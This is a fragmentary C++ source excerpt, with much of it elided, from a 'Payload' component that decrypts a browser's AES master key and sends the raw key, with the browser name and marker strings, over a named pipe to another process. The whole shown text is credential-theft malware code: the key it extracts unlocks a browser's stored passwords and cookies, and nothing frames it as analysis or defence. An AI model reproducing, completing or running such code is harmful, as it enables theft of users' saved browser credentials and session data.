...
namespace Payload
{
    ...
    public:
        ...
        void Run()
        {
            ...
            Log("[+] Decrypted AES MasterKey: " + Utils::BytesToHexString(aesKey));

            SendMasterKeyViaPipe(aesKey);
            Log("[*] Master key extraction completed. Exiting.");
        }
        ...
        void SendMasterKeyViaPipe(const std::vector<uint8_t> &masterKey)
        {
            if (m_pipe != INVALID_HANDLE_VALUE && masterKey.size() == Crypto::KEY_SIZE)
            {
                DWORD bytesWritten = 0;

                // Send a marker indicating master key data follows
                const std::string keyMarker = "__MASTER_KEY_DATA__";
                WriteFile(m_pipe, keyMarker.c_str(), static_cast<DWORD>(keyMarker.length() + 1), &bytesWritten, nullptr);

                // Send browser name first
                const std::string browserName = m_config.name;
                DWORD browserNameLen = static_cast<DWORD>(browserName.length());
                WriteFile(m_pipe, &browserNameLen, sizeof(browserNameLen), &bytesWritten, nullptr);
                WriteFile(m_pipe, browserName.c_str(), browserNameLen, &bytesWritten, nullptr);

                // Send the raw 32-byte master key
                WriteFile(m_pipe, masterKey.data(), static_cast<DWORD>(masterKey.size()), &bytesWritten, nullptr);

                // Send completion marker
                const std::string completionMarker = "__MASTER_KEY_COMPLETE__";
                WriteFile(m_pipe, completionMarker.c_str(), static_cast<DWORD>(completionMarker.length() + 1), &bytesWritten, nullptr);
